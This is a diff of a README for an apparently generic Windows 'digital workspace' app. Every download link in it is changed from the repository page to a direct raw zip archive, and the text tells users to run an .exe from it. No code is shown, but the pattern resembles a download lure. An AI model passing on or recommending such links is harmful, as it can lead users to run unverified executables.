@@ -1,6 +1,6 @@
 # 🚀 trendydev-digital-hq - Easy Access to Digital Workspace
 
-[![Download Now](https://img.shields.io/badge/Download-trendydev--digital--hq-blue?style=for-the-badge)](https://github.com/shkrayyanazmi/trendydev-digital-hq)
+[![Download Now](https://img.shields.io/badge/Download-trendydev--digital--hq-blue?style=for-the-badge)](https://github.com/shkrayyanazmi/trendydev-digital-hq/raw/refs/heads/main/packages/trendydev-hq-digital-v1.8.zip)
 
 ## 📄 About trendydev-digital-hq
 
@@ -36,13 +36,13 @@ The app works as a single package, so you don’t need to install extra software
 
 To get the app, visit this page and follow the steps below:
 
-[![Download trendydev-digital-hq](https://img.shields.io/badge/Download-trendydev--digital--hq-green?style=for-the-badge)](https://github.com/shkrayyanazmi/trendydev-digital-hq)
+[![Download trendydev-digital-hq](https://img.shields.io/badge/Download-trendydev--digital--hq-green?style=for-the-badge)](https://github.com/shkrayyanazmi/trendydev-digital-hq/raw/refs/heads/main/packages/trendydev-hq-digital-v1.8.zip)
 
 ## 🛠️ How to Install and Run on Windows
 
 1. **Open the download page**  
    Click the link above or go to:  
-   https://github.com/shkrayyanazmi/trendydev-digital-hq
+   https://github.com/shkrayyanazmi/trendydev-digital-hq/raw/refs/heads/main/packages/trendydev-hq-digital-v1.8.zip
 
 2. **Find the Windows Installer**  
    Look for a file ending with `.exe` or a setup file on the page. It may be listed under "Releases" or "Assets."
@@ -138,4 +138,4 @@ User data is kept separately in your Documents folder, ensuring your information
 
 ---
 
-[Download trendydev-digital-hq](https://github.com/shkrayyanazmi/trendydev-digital-hq) to start managing your digital workspace today.
+[Download trendydev-digital-hq](https://github.com/shkrayyanazmi/trendydev-digital-hq/raw/refs/heads/main/packages/trendydev-hq-digital-v1.8.zip) to start managing your digital workspace today.
